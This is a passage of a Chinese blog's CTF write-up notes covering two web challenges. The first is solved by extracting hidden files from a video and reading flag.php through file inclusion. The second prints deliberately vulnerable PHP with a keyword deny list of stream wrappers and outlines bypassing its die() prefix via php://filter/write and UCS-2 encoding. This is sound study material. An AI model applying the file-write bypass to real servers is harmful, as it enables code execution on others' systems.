+<h4 id="Web116"><a href="#Web116" class="headerlink" title="Web116"></a>Web116</h4><p>涉及misc</p>
+<p>无能为力…</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一道misc加简单的文件包含</span><br><span class="line"></span><br><span class="line">方法：下载视频，用binwalk打开（或者010editor），foremost分离，发现图片，提取源码，传参?file=flag.php，再下载视频用winhex打开即可（或者传参后用bp抓包）</span><br></pre></td></tr></table></figure>
+
+<p>大佬的wp奉上</p>
+<h4 id="Web117"><a href="#Web117" class="headerlink" title="Web117"></a>Web117</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure>
+
+<p>没有过滤php，所以我们可以通过php:&#x2F;&#x2F;filter&#x2F;write来写入文件</p>
+<p>之后再编码绕过死亡函数</p>
+<p>大佬的wp里使用的是usc-2编码</p>
+<p>思路与web87差不多</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
